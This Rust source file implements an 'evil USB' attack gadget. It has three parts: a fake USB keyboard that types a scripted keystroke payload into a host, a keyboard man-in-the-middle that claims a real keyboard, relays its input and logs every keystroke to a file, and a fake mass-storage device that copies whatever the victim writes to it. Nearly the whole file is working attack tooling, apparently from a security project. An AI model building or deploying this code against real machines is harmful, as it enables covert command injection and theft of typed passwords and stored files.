use std::io::Write;
use usb_gadget::{
    default_udc,
    function::{
        hid::Hid,
        msd::{Lun, Msd},
    },
    Class, Config, Gadget, Id, RegGadget, Strings,
};

use usbd_hid::descriptor::{KeyboardReport, SerializedDescriptor};

use rusb::{Context, Device, DeviceHandle, HotplugBuilder, InterfaceDescriptor, UsbContext};

const HID: u8 = 0x03;
const HID_KEYBOARD: u8 = 0x01;

#[derive(Debug)]
pub enum WMSError {
    FileError(std::io::Error),
    SyntaxError,
    GadgetSetupError(std::io::Error),
    RuntimeError,
}

impl std::fmt::Display for WMSError {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        write!(f, "{:?}", *self)
    }
}

impl std::error::Error for WMSError {}

pub trait Attack {
    fn setup_gadget(&mut self) -> Result<RegGadget, WMSError>;
}

pub trait InputAttack: Attack {
    fn read_script(&mut self, path: &str) -> Result<(), WMSError>;
    fn input_attack(&mut self) -> Result<(), WMSError>;
}

pub trait SnoopAttack: Attack {
    fn open_logfile(&mut self, path: &str) -> Result<(), WMSError>;
    fn snoop_attack(self) -> Result<(), WMSError>;
}

pub struct WMSKeyboardDevice {
    keystrokes: Vec<[u8; 8]>,
    file: Option<std::fs::File>,
    keyboard_fd: Option<std::fs::File>,
}

impl WMSKeyboardDevice {
    pub fn new() -> WMSKeyboardDevice {
        WMSKeyboardDevice {
            keystrokes: Vec::new(),
            file: None,
            keyboard_fd: None,
        }
    }

    /// Converts a string to a HID report
    ///
    /// Strings represent a single character, potentially with modifiers
    /// Lines may look as follows:
    /// Single character: "a"
    /// Character with modifier: "shift a"
    /// Character with multiple modifiers: "shift ctrl a"
    pub fn string_to_report(s: &str) -> [u8; 8] {
        str_to_keycode(s)
    }
}

impl Attack for WMSKeyboardDevice {
    fn setup_gadget(&mut self) -> Result<RegGadget, WMSError> {
        let mut builder = Hid::builder();
        builder.protocol = 1;
        builder.sub_class = 1;
        builder.report_len = 8;
        builder.report_desc = KeyboardReport::desc().to_vec(); //std::fs::read("~/kybd-descriptor.bin").expect("Could not open file: kybd-descriptor.bin");
        let (hid, handle) = builder.build();

        let udc = default_udc().expect("Cannot get UDC");
        let reg = Gadget::new(
            Class::new(1, 2, 3),
            Id::new(4, 5),
            Strings::new("Cole", "evil USB", "Cereal Value"),
        )
        .with_config(Config::new("cfg1").with_function(handle))
        .bind(&udc)
        .map_err(|e| WMSError::GadgetSetupError(e))?;

        println!(
            "HID device {:?} at {}",
            hid.device().unwrap(),
            hid.status().path().unwrap().display()
        );
        let kybd_fd = std::fs::File::options()
            .read(false)
            .write(true)
            .open("/dev/hidg0") // TODO: Can this be acquired programmatically?
            .expect("Could not open HID device");

        std::thread::sleep(std::time::Duration::from_millis(1000));
        self.keyboard_fd = Some(kybd_fd);
        Ok(reg)
    }
}

impl InputAttack for WMSKeyboardDevice {
    fn read_script(&mut self, path: &str) -> Result<(), WMSError> {
        let script = std::fs::read_to_string(path).expect("Could not read script file");
        println!("Read {}", script);
        let lines = script.lines();
        for line in lines {
            self.keystrokes.push(str_to_keycode(line))
        }
        Ok(())
    }

    fn input_attack(&mut self) -> Result<(), WMSError> {
        let mut kybd_fd = self.keyboard_fd.take().unwrap();
        for keystroke in &self.keystrokes {
            kybd_fd
                .write_all(keystroke)
                .map_err(|e| WMSError::FileError(e))?;
            //todo!("Convert keystroke input to HID report");
            // let mut keyboard_report: [u8; 8] = [0, 0, 0, 0, 0, 0, 0, 0];
            // let mut i = 2;
            // for c in keystroke.chars() {
            //     keyboard_report[i] = c as u8;
            //     i += 1;
            // }
            std::thread::sleep(std::time::Duration::from_millis(100));
            //let rv = kybd_fd.write_all(&keyboard_report);
            //println!("Wrote {:?} bytes\n", rv);
        }
        kybd_fd
            .write_all(&[0u8; 8])
            .expect("Could not write to HID");

        Ok(())
    }
}

impl<T: UsbContext> rusb::Hotplug<T> for WMSKeyboardDevice {
    fn device_arrived(&mut self, device: Device<T>) {
        println!("Device arrived: {:?}", device);
        let dev_desc = device
            .device_descriptor()
            .expect("Could not get device descriptor");
        let vid = dev_desc.vendor_id();
        let pid = dev_desc.product_id();
        let mut handle = rusb::open_device_with_vid_pid(vid, pid).expect("Could not open device");
        let active_config = handle
            .active_configuration()
            .expect("Could not get active config");
        let config = device
            .config_descriptor(active_config - 1)
            .expect("Could not get config descriptor");

        for iface in config.interfaces() {
            let idesc = iface
                .descriptors()
                .next()
                .expect("Could not get interface descriptor");

            if is_keyboard(&idesc) {
                let endpdesc = idesc
                    .endpoint_descriptors()
                    .next()
                    .expect("Could not get endpoint descriptor");

                detach_interface(&mut handle, idesc.interface_number());
                claim_interface(&mut handle, idesc.interface_number());

                let mut buf: Vec<u8> = vec![0u8; endpdesc.max_packet_size().into()];
                let mut kybd_fd = self.keyboard_fd.take().unwrap();
                let mut log_fd = self.file.take().unwrap();

                loop {
                    match handle.read_bulk(
                        endpdesc.address(),
                        &mut buf,
                        std::time::Duration::from_secs(5),
                    ) {
                        Ok(_) => {
                            println!("Read {:?} bytes", buf);
                            kybd_fd.write_all(&buf).expect("Could not write to HID");
                            log_fd.write_all(&buf).expect("Could not write to log");
                        }
                        Err(e) => {
                            eprintln!("Error reading from device: {}", e);
                        }
                    }
                }
            }
        }
    }

    fn device_left(&mut self, device: Device<T>) {
        println!("Device left: {:?}", device);
    }
}

impl SnoopAttack for WMSKeyboardDevice {
    fn open_logfile(&mut self, path: &str) -> Result<(), WMSError> {
        self.file = Some(
            std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .open(path)
                .map_err(|e| WMSError::FileError(e))?,
        );
        Ok(())
    }

    fn snoop_attack(self) -> Result<(), WMSError> {
        // Step 1: Wait for keyboard to be plugged in
        if !rusb::has_hotplug() {
            println!("Hotplug not supported!");
            return Err(WMSError::RuntimeError);
        }

        let context = Context::new().map_err(|_| WMSError::RuntimeError)?;

        let _reg = HotplugBuilder::new()
            .register::<Context, &Context>(&context, Box::new(self))
            .map_err(|_| WMSError::RuntimeError)?;

        loop {
            if let Err(err) = context.handle_events(None) {
                eprintln!("Error handling events: {}", err);
                return Err(WMSError::RuntimeError);
            }
        }
    }
}

pub struct WMSMassStorageDevice {
    fakefs: std::path::PathBuf,
    logfs: Option<std::path::PathBuf>,
}

impl WMSMassStorageDevice {
    pub fn new(path: impl AsRef<std::path::Path>) -> std::io::Result<Self> {
        Ok(WMSMassStorageDevice {
            fakefs: std::fs::canonicalize(path)?,
            logfs: None,
        })
    }
}

impl Attack for WMSMassStorageDevice {
    fn setup_gadget(&mut self) -> Result<RegGadget, WMSError> {
        let mut builder = Msd::builder();
        builder.add_lun(Lun::new(self.fakefs.clone()).map_err(|e| WMSError::FileError(e))?);
        let (msd, handle) = builder.build();

        let udc = default_udc().expect("Cannot get UDC");
        let reg = Gadget::new(
            Class::new(1, 2, 3),
            Id::new(4, 5),
            Strings::new("Cole", "evil USB", "Cereal Value"),
        )
        .with_config(Config::new("cfg1").with_function(handle))
        .bind(&udc)
        .map_err(|e| WMSError::GadgetSetupError(e))?;

        println!("MSD device at {}", msd.status().path().unwrap().display());
        Ok(reg)
    }
}

impl SnoopAttack for WMSMassStorageDevice {
    fn open_logfile(&mut self, path: &str) -> Result<(), WMSError> {
        self.logfs = Some(std::path::PathBuf::from(path));
        Ok(())
    }

    fn snoop_attack(self) -> Result<(), WMSError> {
        let mut inotify = inotify::Inotify::init().expect("Could not initialize inotify");
        inotify
            .watches()
            .add(self.fakefs.clone(), inotify::WatchMask::MODIFY)
            .expect("Could not add watch");

        loop {
            let mut buffer = [0; 2048];
            let _events = inotify
                .read_events_blocking(&mut buffer)
                .expect("Could not read events");

            println!("Read events from inotify");

            // Use rsync to mirror the fakefs to the logfs
            let mut cmd = std::process::Command::new("rsync");
            let mut child = cmd
                .args([
                    "-avW",
                    "--no-compress",
                    self.fakefs.clone().to_str().unwrap(),
                    self.logfs.clone().unwrap().to_str().unwrap(),
                ])
                .spawn()
                .expect("Failed to rsync");
            child.wait().expect("Command wasn't running");
            // Since we drop 'events', we amortize some successive event writing
        }
    }
}

// Utility functions
fn str_to_keycode(c: &str) -> [u8; 8] {
    let mut keycode = [0; 8];
    // First handle modifiers
    let words: Vec<&str> = c.split_whitespace().collect();
    if words.len() == 0 {
        println!("Invalid length for line {}", c);
        return keycode;
    }
    if words.len() > 1 {
        for modifier in words[0..words.len() - 1].iter() {
            match *modifier {
                "shift" => keycode[0] |= 0x02,
                "ctrl" => keycode[0] |= 0x01,
                "alt" => keycode[0] |= 0x04,
                "gui" => keycode[0] |= 0x08,
                _ => (),
            }
        }
    }

    // Only 1 key per line for now
    let c = words[words.len() - 1];
    match c {
        "a" => keycode[2] = 4,
        "b" => keycode[2] = 5,
        "c" => keycode[2] = 6,
        "d" => keycode[2] = 7,
        "e" => keycode[2] = 8,
        "f" => keycode[2] = 9,
        "g" => keycode[2] = 10,
        "h" => keycode[2] = 11,
        "i" => keycode[2] = 12,
        "j" => keycode[2] = 13,
        "k" => keycode[2] = 14,
        "l" => keycode[2] = 15,
        "m" => keycode[2] = 16,
        "n" => keycode[2] = 17,
        "o" => keycode[2] = 18,
        "p" => keycode[2] = 19,
        "q" => keycode[2] = 20,
        "r" => keycode[2] = 21,
        "s" => keycode[2] = 22,
        "t" => keycode[2] = 23,
        "u" => keycode[2] = 24,
        "v" => keycode[2] = 25,
        "w" => keycode[2] = 26,
        "x" => keycode[2] = 27,
        "y" => keycode[2] = 28,
        "z" => keycode[2] = 29,
        "1" => keycode[2] = 30,
        "2" => keycode[2] = 31,
        "3" => keycode[2] = 32,
        "4" => keycode[2] = 33,
        "5" => keycode[2] = 34,
        "6" => keycode[2] = 35,
        "7" => keycode[2] = 36,
        "8" => keycode[2] = 37,
        "9" => keycode[2] = 38,
        "0" => keycode[2] = 39,
        "\n" => keycode[2] = 40,
        "\t" => keycode[2] = 43,
        " " => keycode[2] = 44,
        "-" => keycode[2] = 45,
        "=" => keycode[2] = 46,
        "[" => keycode[2] = 47,
        "]" => keycode[2] = 48,
        "\\" => keycode[2] = 49,
        ";" => keycode[2] = 51,
        "\'" => keycode[2] = 52,
        "`" => keycode[2] = 53,
        "," => keycode[2] = 54,
        "." => keycode[2] = 55,
        "/" => keycode[2] = 56,
        "enter" => keycode[2] = 40,
        "tab" => keycode[2] = 43,
        "meta" => keycode[2] = 231,
        "release" => keycode[2] = 0,
        "space" => keycode[2] = 44,
        _ => keycode[2] = 0,
    }
    keycode
}

pub fn is_keyboard(device: &InterfaceDescriptor) -> bool {
    device.class_code() == HID && device.sub_class_code() == HID_KEYBOARD
}

pub fn detach_interface<T: UsbContext>(handle: &mut DeviceHandle<T>, iface_num: u8) {
    match handle.detach_kernel_driver(iface_num) {
        Ok(_) => {
            println!("Detached Interface");
        }
        Err(err) => {
            eprintln!("Error detaching USB Interface: {}", err);
        }
    }
}

pub fn claim_interface<T: UsbContext>(handle: &mut DeviceHandle<T>, iface_num: u8) {
    match handle.claim_interface(iface_num) {
        Ok(_) => {
            println!("Claimed Interface");
        }
        Err(err) => {
            eprintln!("Error claiming USB Interface: {}", err);
        }
    }
}
